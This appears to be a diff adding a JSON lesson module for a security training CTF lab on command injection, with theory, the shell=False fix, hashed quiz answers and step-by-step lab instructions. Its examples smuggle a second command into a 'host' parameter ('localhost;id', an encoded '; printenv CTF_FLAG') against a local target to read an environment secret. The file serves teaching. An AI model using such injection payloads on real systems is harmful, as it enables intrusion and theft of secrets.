@@ -1,0 +1,48 @@
+{
+  "order": 4,
+  "id": "cmdi",
+  "title": "Command Injection",
+  "track": "OWASP Top 10",
+  "difficulty": "core",
+  "estimate": "20 min",
+  "brief": "**Ticket:** a 'ping host' diagnostic feature runs a shell command with your input. Break out of it and read a secret from the server's environment.",
+  "theory": "## Command Injection (OWASP A03)\nThe server builds a shell command with your input and runs it. Metacharacters like `;` `|` `&&` let you add your own command \u2014 often full server takeover.\n\n**Fix:** no shell \u2014 pass an argument list (`shell=False`) and validate input.",
+  "worked_example": "```\n$ curl \"https://x/diag?host=localhost;id\"\nuid=33(www-data) gid=33 ...   # a second command ran\n```",
+  "knowledge_check": [
+    {
+      "q": "Which character chains a second shell command?",
+      "type": "command",
+      "answer_sha256": "41b805ea7ac014e23556e98bb374702a08344268f92489a02f0880849394a1e4"
+    },
+    {
+      "q": "The fix is to avoid the shell and pass an ___",
+      "type": "choice",
+      "choices": [
+        "argument list",
+        "env var",
+        "alias",
+        "pipe"
+      ],
+      "answer_sha256": "82fa28d358d5abb18028dabed7be3ae3c3a1ea9b196e920a2257f58b05554bcf"
+    }
+  ],
+  "investigation": {
+    "intro": "Inject a second command to print the CTF_FLAG environment variable.",
+    "steps": [
+      "```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave this running\n```",
+      "In a second terminal, chain a command (%3B is an encoded ';'):\n```bash\ncurl -s \"http://127.0.0.1:5000/diag?host=x%3B%20printenv%20CTF_FLAG\"\n```",
+      "The flag is printed after the normal diagnostic output."
+    ],
+    "hints": [
+      "A semicolon ends one command and starts another.",
+      "`printenv CTF_FLAG` prints the secret.",
+      "URL-encode the semicolon and spaces (%3B, %20)."
+    ]
+  },
+  "capture": {
+    "task": "**Capture the flag.** Inject a command that prints `CTF_FLAG` and submit the `FLAG{...}`.",
+    "hint": "host=x; printenv CTF_FLAG",
+    "placeholder": "FLAG{...}",
+    "answer_sha256": "76da1d8fc9dd72544925e14258e5df55ab46079f37b6b0157275a20f824983a2"
+  }
+}
